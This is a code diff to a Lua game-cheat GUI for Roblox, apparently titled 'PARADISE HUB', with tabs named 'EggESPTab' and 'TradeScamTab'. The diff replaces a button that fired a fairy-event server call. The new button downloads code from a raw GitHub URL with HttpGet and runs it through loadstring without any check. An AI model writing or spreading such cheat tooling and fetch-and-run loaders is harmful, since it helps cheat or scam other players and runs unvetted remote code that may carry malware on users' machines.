@@ -886,7 +886,7 @@ Tabs.EggESPTab:Paragraph(
 Tabs.TradeScamTab:Paragraph(
     {
         Title = "FAIRY EVENT",
-        Desc = "PARADISE HUB",
+        Desc = "PARADISE HUB Note : If You execute fairy event script this gui will be deleted you need to rexecute this script",
         Image = "shield-alert",
         Color = "Red"
     }
@@ -894,13 +894,10 @@ Tabs.TradeScamTab:Paragraph(
 
 Tabs.TradeScamTab:Button(
     {
-        Title = "SEND ALL PLANTS TO FAIRY",
+        Title = "LOAD FAIRY EVENT SCRIPT",
         Icon = "shield-alert",
         Callback = function()
-            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents")
-                :WaitForChild("FairyService")
-                :WaitForChild("SubmitFairyFountainAllPlants")
-                :FireServer()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/idk'))()
         end
     }
 )
